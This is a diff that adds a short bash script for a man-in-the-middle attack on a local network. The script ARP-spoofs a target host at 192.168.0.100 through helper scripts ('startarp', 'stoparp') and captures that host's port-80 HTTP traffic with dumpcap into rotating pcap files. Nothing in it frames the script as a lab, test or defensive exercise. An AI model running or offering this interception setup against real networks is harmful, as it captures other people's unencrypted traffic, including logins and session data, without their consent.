@@ -1,0 +1,13 @@
+#!/bin/bash
+
+INF=eth0
+
+source trap-int
+
+echo "Log: you have to arpspoof 192.168.0.100 (target) first!"
+
+./startarp 192.168.0.100 $INF
+
+dumpcap -i $INF -f "tcp and host 192.168.0.100 and not host 192.168.0.1 and port 80"  -b files:1000 -b duration:3600 -w target-dump.pcap
+
+./stoparp
